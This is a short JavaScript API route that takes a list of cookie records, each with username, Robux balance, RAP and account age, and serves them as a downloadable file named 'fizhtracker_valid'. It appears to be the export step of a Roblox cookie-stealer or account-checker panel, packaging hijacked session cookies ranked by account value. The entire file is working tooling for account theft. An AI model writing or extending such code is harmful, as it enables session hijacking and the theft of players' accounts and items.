export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    const { cookies } = req.body;
    if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
        return res.status(400).json({ error: 'No valid cookies to download' });
    }

    const content = cookies.map(c => {
        return `Cookie: ${c.cookie}\nUsername: ${c.username}\nRobux: ${c.robux}\nRAP: ${c.rap}\nAge: ${c.accountAge} days\n---\n`;
    }).join('\n');

    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename=fizhtracker_valid_${Date.now()}.txt`);
    res.status(200).send(content);
}
